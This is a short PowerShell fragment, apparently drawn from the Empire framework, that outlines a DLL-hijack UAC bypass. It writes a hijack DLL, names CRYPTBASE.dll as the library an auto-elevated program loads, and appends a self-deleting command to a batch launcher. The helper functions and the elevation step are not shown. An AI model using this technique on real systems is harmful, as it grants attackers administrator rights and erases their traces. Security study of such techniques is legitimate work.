# DLL-hijack UAC bypass shape: Empire entrypoint plus hijack payload,
# known auto-elevated target name, and a self-deleting launcher.
function Invoke-BypassUAC {
  Write-HijackDll -OutputFile $TempPayloadPath -BatchPath $BatchPath
  $szElevDll = 'CRYPTBASE.dll'
  'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Append $BatchPath
}
